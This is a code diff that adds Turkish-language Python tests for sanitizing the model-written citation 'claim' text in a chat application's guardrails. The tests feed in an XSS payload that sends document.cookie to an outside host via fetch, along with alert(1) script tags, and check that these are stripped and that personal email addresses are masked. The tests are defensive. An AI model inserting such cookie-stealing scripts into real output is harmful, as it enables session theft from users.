@@ -970,3 +970,77 @@ class TestOnbellekZinciri:
         )
 
         assert not screen_cached(cevap).blocked
+
+
+# ---------------------------------------------------------------------------
+# `claim` — atıf kartında görünen, TAMAMEN modelin yazdığı tek metin
+#
+# Zincir bu alanı hiç görmüyor: hiçbir karar ona bakmıyor ve `contracts.Citation`
+# içinde bile yok. Sanitize'ın kapsamadığı bir ekran yüzeyiydi.
+# ---------------------------------------------------------------------------
+
+
+class TestIddiaMetniTemizligi:
+    def _chunk_ve_iddia(self, iddia: str) -> tuple[RetrievedChunk, dict[UUID, str]]:
+        from app.modules.guardrails.citation import build_citations
+        from app.schemas.chat import LlmCitation
+
+        kaynak = chunk()
+        _, claims = build_citations([LlmCitation(chunk_id=kaynak.chunk_id, claim=iddia)], [kaynak])
+        return kaynak, claims
+
+    def test_modelin_yazdigi_etiket_temizlenir(self) -> None:
+        kaynak, claims = self._chunk_ve_iddia(
+            "<script>fetch('//x/'+document.cookie)</script> bu kaynak bunu destekliyor"
+        )
+
+        assert "<script>" not in claims[kaynak.chunk_id]
+        assert "fetch(" not in claims[kaynak.chunk_id]
+        assert "destekliyor" in claims[kaynak.chunk_id]
+
+    def test_kisisel_veri_maskelenir(self) -> None:
+        kaynak, claims = self._chunk_ve_iddia("İletişim: hoca@dogus.edu.tr adresinden")
+
+        assert "hoca@dogus.edu.tr" not in claims[kaynak.chunk_id]
+
+    def test_mesru_iddia_bozulmaz(self) -> None:
+        """Temizlik Türkçe metni ve teknik gösterimi yemeyecek kadar dar olmalı."""
+        metin = "Coffman koşulları: karşılıklı dışlama, tut ve bekle (bkz. O(n log n))"
+        kaynak, claims = self._chunk_ve_iddia(metin)
+
+        assert claims[kaynak.chunk_id] == metin
+
+    def test_temizlikte_bosalan_iddia_hic_tasinmaz(self) -> None:
+        """Boş bir iddia anahtarı zarfa boş bir alan koyardı; hiç koymamak yeğ."""
+        kaynak, claims = self._chunk_ve_iddia("<script>alert(1)</script>")
+
+        assert kaynak.chunk_id not in claims
+
+    async def test_uctan_uca_zarfa_temiz_gidiyor(self) -> None:
+        """Üretim yolunun tamamı: model çıktısı → servis → zarf."""
+        from app.contracts import ChatMode as _ChatMode
+        from app.modules.generation.service import GenerationService
+
+        kaynak = chunk()
+        payload = json.dumps(
+            {
+                "status": "answered",
+                "answer": "Materyale göre dört koşul gerekir.",
+                "citations": [
+                    {
+                        "chunk_id": str(kaynak.chunk_id),
+                        "claim": "<script>alert(1)</script> dört koşul",
+                    }
+                ],
+                "hints": [],
+            },
+            ensure_ascii=False,
+        )
+        service = GenerationService(llm=ScriptedLlm(payload))
+
+        sonuc = await service.generate_with_claims(
+            question="Nedir?", chunks=[kaynak], mode=_ChatMode.QA
+        )
+
+        assert "<script>" not in sonuc.claims[kaynak.chunk_id]
+        assert "dört koşul" in sonuc.claims[kaynak.chunk_id]
